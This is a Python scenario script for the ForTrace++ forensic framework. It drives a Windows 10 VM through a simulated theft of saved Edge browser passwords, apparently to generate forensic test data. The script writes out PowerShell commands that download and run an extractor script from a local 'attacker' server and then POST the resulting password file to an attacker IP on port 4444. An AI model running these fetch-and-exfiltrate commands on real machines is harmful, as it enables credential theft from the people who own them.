#!/usr/bin/env python3
"""A Windows 10 scenario for browser password exfiltration
The scenario is configured through the YAML located in this directory.

This scenario demonstrates how saved passwords in Microsoft Edge can be
extracted and exfiltrated by an attacker.

Typical usage:
    > cd ~/fortrace
    > source .venv/bin/activate
    > python scenarios/scenario2-browser_password_exfiltration/scenario2.py
    > cd ~/fortrace/scenarios/scenario2-browser_password_exfiltration
    > python -m http.server 8081 # On attacker machine
    > python http_upload_server.py
"""
import pathlib
from time import sleep

from fortrace.core.simulation_monitor import SimulationMonitor
from fortrace.core.virsh_domain import GraphicalVirshDomain
from fortrace.fortrace_definitions import FORTRACE_ROOT_DIR
from fortrace.utility.applications.application import (
    ApplicationType,
)
from fortrace.utility.applications.console.powershell import PowerShell
from fortrace.utility.logger_helper import setup_logger

# Create a logger using ForTrace++'s logger helper
logger = setup_logger(__name__)


def scenario_2():
    monitor = SimulationMonitor(
        pathlib.Path(
            FORTRACE_ROOT_DIR,
            "scenarios/scenario2-browser_password_exfiltration/scenario2.yaml",
        )
    )
    domain = monitor.participant[0].domain  # type: GraphicalVirshDomain
    config = monitor.participant[0].config

    domain.boot(
        start_sniffer=config["domain"]["start_sniffer"],
        snapshot=config["domain"]["snapshot"],
    )

    domain.env.login(config["domain"]["username"], config["domain"]["password"])

    # Log that the system is unattended
    logger.info("System state: Unattended Windows 10 machine with browser passwords stored.")

    browser_password_exfiltration(domain, config)
    monitor.post_scenario()


def browser_password_exfiltration(domain: GraphicalVirshDomain, config: dict):
    """
    Simulates the extraction and exfiltration of passwords from Microsoft Edge browser.
    Downloads a password extraction script, executes it to extract credentials,
    and uploads the extracted credentials to an attacker-controlled server.
    """

    # Log the beginning of the attack
    logger.info("Attacker: Initiating browser password exfiltration attack on Windows 10.")

    # Open a PowerShell instance with elevated privileges
    ps = domain.env.open_application(
        ApplicationType.TERMINAL, "Windows PowerShell", run_as_administrator=True
    )  # type: PowerShell

    sleep(2)  # Wait for PowerShell window to fully open

    # Step 1: Navigate to Desktop directory
    ps.send_command(r"cd C:\Users\fortrace\Desktop", get_output=False)
    sleep(1)

    # Step 2: Download the password extractor script from attacker server
    logger.info("Attacker: Downloading password extraction script.")
    download_command = r'Invoke-WebRequest -Uri "http://192.168.122.1:8081/edge_password_extractor.py" -OutFile "C:\Users\fortrace\Desktop\edge_password_extractor.py"'
    ps.send_command(download_command, get_output=False)
    sleep(3)  # Wait for download to complete

    # Step 3: Execute the password extraction script
    logger.info("Attacker: Executing password extraction script to retrieve browser credentials.")
    ps.send_command(r"python C:\Users\fortrace\Desktop\edge_password_extractor.py", get_output=False)
    sleep(5)  # Give time for script to extract passwords

    # Step 4: Exfiltrate the extracted passwords to attacker server
    logger.info("Attacker: Exfiltrating extracted passwords to remote server.")
    attacker_ip = config["backdoor"]["attacker_ip"]
    exfiltrate_command = f'Invoke-WebRequest -Uri "http://{attacker_ip}:4444/upload" -Method POST -InFile "C:\\Users\\fortrace\\Desktop\\extracted_passwords.txt" -UseBasicParsing'
    ps.send_command(exfiltrate_command, get_output=False)
    sleep(3)  # Wait for upload to complete

    # Log successful exfiltration
    logger.info(f"Attacker: Password exfiltration complete. Credentials sent to {attacker_ip}.")
    logger.info("Forensic Artifact: Extracted password file at C:\\Users\\fortrace\\Desktop\\extracted_passwords.txt")

    # Close the PowerShell application
    ps.close()


def setup_browser_credentials(domain: GraphicalVirshDomain):
    """
    Optional function to set up credentials in Microsoft Edge for testing purposes.
    This would involve automating the browser to visit websites and save credentials.
    """
    # This function can be implemented in the future to automate browser credential setup
    # For now, the scenario assumes credentials are already saved in the browser

    logger.info("Note: This function for setting up browser credentials automatically is not implemented.")
    logger.info("Please ensure the VM snapshot has pre-saved credentials in Microsoft Edge.")


if __name__ == "__main__":
    scenario_2()
